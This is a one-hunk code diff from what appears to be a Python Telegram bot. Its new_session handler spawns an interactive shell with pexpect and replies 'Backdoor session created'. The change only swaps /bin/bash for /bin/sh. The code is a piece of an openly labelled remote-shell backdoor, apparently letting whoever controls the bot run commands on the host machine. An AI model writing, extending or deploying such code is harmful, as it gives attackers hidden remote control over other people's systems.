@@ -43,7 +43,7 @@ def new_session(update, context):
     global child
     if child:
         child.kill(0)
-    child = pexpect.spawn('/bin/bash')
+    child = pexpect.spawn('/bin/sh')
     child.expect('\$')
     output = "Backdoor session created"
     update.message.reply_text(output)
